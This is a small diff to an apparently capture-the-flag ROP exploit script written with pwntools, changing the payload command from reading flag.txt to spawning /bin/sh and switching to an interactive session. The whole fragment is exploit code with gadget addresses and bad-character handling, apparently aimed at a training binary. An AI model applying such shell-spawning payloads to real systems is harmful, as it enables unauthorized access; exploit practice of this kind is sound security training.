@@ -41,7 +41,8 @@ badchars = b'bic/ fns'
 padding = b'A'*40
 system = p64(0x4006f0)
 exit = p64(0x400770)
-cmd = b'cat flag.txt'.ljust(16,b'\0')
+# cmd = b'cat flag.txt'.ljust(16,b'\0')
+cmd = b'/bin/sh'.ljust(16,b'\0')
 data_int = 0x601078
 mov_r13_r12 = p64(0x400b34)
 pop_r12_r13 = p64(0x400b3b)
@@ -71,4 +72,5 @@ p.recvline()
 p.recvline()
 p.recvline()
 p.recvline()
-print(p.recvall().decode())
+# print(p.recvall().decode())
+p.interactive()
